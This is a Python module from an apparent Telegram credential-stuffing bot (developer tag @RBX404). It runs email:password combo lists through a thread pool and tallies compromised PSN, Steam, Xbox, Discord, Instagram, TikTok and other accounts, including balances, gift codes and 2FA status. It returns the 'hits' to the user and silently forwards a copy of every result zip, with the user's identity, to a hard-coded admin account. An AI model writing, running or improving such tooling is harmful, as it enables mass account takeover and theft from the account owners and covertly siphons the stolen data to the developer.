import time
import shutil
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from HOME import state
from HOME.helpers import (
    bold, italic, mono, E_FIRE, E_STOP, E_FILE, E_GEAR, E_CROSS,
    E_USER, E_PIN, E_CHART, E_CLOCK, E_CAMERA, E_KEY, E_GIFT,
    E_MONEY, E_DIAMOND, E_RED, E_GAME, E_CHECK
)
from HOME.messages import build_status_message, build_summary_message
from HOME.results import build_result_zip, build_hits_text
from DATABASE.database import load_db, get_user, save_db
from CONFIG.config import MASTER_THREADS, DEFAULT_THREADS, ADMIN_ID


def run_checker(cs, message, user):
    chat_id = message.chat.id

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop", callback_data=f"stop_check_{cs.user_id}")
    )

    status_msg = state.bot.send_message(
        chat_id, build_status_message(cs),
        parse_mode="HTML", reply_to_message_id=message.message_id,
        reply_markup=markup, disable_web_page_preview=True
    )
    cs.msg_id = status_msg.message_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                markup2 = types.InlineKeyboardMarkup(row_width=2)
                markup2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits", callback_data=f"get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop", callback_data=f"stop_check_{cs.user_id}")
                )
                state.bot.edit_message_text(
                    build_status_message(cs),
                    chat_id=chat_id, message_id=cs.msg_id,
                    parse_mode="HTML", reply_markup=markup2, disable_web_page_preview=True
                )
            except:
                pass
            time.sleep(3)

    threading.Thread(target=updater, daemon=True).start()

    executor = ThreadPoolExecutor(max_workers=MASTER_THREADS, thread_name_prefix="chk")
    cs.executor = executor
    try:
        futures = []
        for email, pwd in cs.combos:
            if cs.stop_event.is_set():
                break
            futures.append(executor.submit(cs.process_one, email, pwd))
        cs.futures = futures

        for f in as_completed(futures):
            if cs.stop_event.is_set():
                # Cancel all pending (not yet started) futures immediately
                for fut in futures:
                    fut.cancel()
                try:
                    executor.shutdown(wait=False, cancel_futures=True)
                except TypeError:
                    executor.shutdown(wait=False)
                break
            try:
                f.result(timeout=0.1)
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass

    cs.finished = True
    stopped = cs.stop_event.is_set()

    db_inst = load_db()
    u = get_user(db_inst, cs.user_id)
    u["total_checked"] += cs.stats.checked
    u["total_hits"] += len(cs.stats.all_hits)
    u["total_lines"] += cs.stats.valid
    u["checks_count"] = u.get("checks_count", 0) + 1
    db_inst["global_stats"]["total_checked"] += cs.stats.checked
    db_inst["global_stats"]["total_hits"] += len(cs.stats.all_hits)
    db_inst["global_stats"]["total_lines_checked"] += cs.stats.valid
    save_db(db_inst)

    # Always send summary first (quick — just edit a message)
    try:
        state.bot.edit_message_text(
            build_summary_message(cs, stopped),
            chat_id=chat_id, message_id=cs.msg_id,
            parse_mode="HTML", disable_web_page_preview=True
        )
    except Exception:
        pass

    # Send results in a daemon thread so we never block the bot
    def _send_results():
        try:
            zip_path, tmpdir = build_result_zip(cs, user=user)
            with open(zip_path, 'rb') as f:
                state.bot.send_document(
                    chat_id, f,
                    caption=f"{E_FILE} {bold('Results')} | {italic('Dev: @RBX404')}",
                    parse_mode="HTML", reply_to_message_id=message.message_id
                )
            with open(zip_path, 'rb') as f:
                user_profile_link = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
                user_name = ((user.first_name or "") + " " + (user.last_name or "")).strip() or "User"
                admin_caption = (
                    f"{E_FILE} {bold('Check Completed')}\n"
                    f"{E_USER} Checked by: <a href=\"{user_profile_link}\">{user_name}</a>\n"
                    f"{E_PIN} User ID: {mono(str(user.id))}\n"
                    f"{E_CHART} Lines: {mono(str(cs.stats.valid))} | Hits: {mono(str(len(cs.stats.all_hits)))}\n"
                    f"{E_CLOCK} Duration: {mono(time.strftime('%H:%M:%S', time.gmtime(time.time() - cs.started)))}\n"
                    f"{E_GEAR} {italic('Dev: @RBX404')}\n\n"
                    f"{bold('Summary:')}\n"
                    f"{E_GAME} PSN: {mono(str(cs.stats.psn))} | Steam: {mono(str(cs.stats.steam))}\n"
                    f"{E_GAME} Supercell: {mono(str(cs.stats.supercell))} | TikTok: {mono(str(cs.stats.tiktok))}\n"
                    f"{E_CAMERA} Instagram: {mono(str(cs.stats.instagram))} | Minecraft: {mono(str(cs.stats.minecraft))}\n"
                    f"{E_KEY} Xbox Codes: {mono(str(cs.stats.xbox_codes))}  Pulled: {mono(str(cs.stats.xbox_pulled))} (Valid: {mono(str(cs.stats.xbox_pulled_valid))})\n"
                    f"{E_GIFT} Discord: {mono(f'{cs.stats.discord_valid}/{cs.stats.discord_total}')}\n"
                    f"{E_MONEY} Balance: {mono(str(cs.stats.balance))} | RP: {mono(str(cs.stats.rp_hits))} ({cs.stats.rp_total_pts} pts)\n"
                    f"{E_RED} Bad: {mono(str(cs.stats.bad))} | 2FA: {mono(str(cs.stats.twofa))} | Errors: {mono(str(cs.stats.errors))}"
                )
                state.bot.send_document(ADMIN_ID, f, caption=admin_caption, parse_mode="HTML")
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass
        except Exception as e:
            try:
                state.bot.send_message(chat_id, f"{E_CROSS} Error sending results: {mono(str(e))}", parse_mode="HTML")
            except Exception:
                pass

    threading.Thread(target=_send_results, daemon=True).start()

    with state.active_checks_lock:
        if cs.user_id in state.active_checks:
            del state.active_checks[cs.user_id]
